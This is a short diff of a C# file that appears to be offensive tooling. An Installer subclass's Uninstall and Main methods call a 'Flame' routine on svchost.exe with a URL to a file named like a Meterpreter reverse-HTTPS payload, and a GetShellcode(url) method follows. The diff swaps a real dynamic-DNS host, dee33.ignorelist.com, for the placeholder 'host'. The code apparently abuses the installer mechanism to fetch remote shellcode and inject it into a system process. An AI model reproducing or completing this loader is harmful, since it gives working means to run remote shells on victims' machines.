@@ -12,11 +12,11 @@ public class Sample : System.Configuration.Install.Installer
 
     public override void Uninstall(System.Collections.IDictionary savedState)
     {
-        Flame(@"C:\Windows\System32\svchost.exe", @"http://dee33.ignorelist.com/mtr_rvrs_https_102.tiki");
+        Flame(@"C:\Windows\System32\svchost.exe", @"http://host/mtr_rvrs_https_102.tiki");
     }
         public static void Main()
     {
-        Flame(@"C:\Windows\System32\svchost.exe", @"http://dee33.ignorelist.com/mtr_rvrs_https_102.tiki");
+        Flame(@"C:\Windows\System32\svchost.exe", @"http://host/mtr_rvrs_https_102.tiki");
     }
     
     private static byte[] GetShellcode(string url)
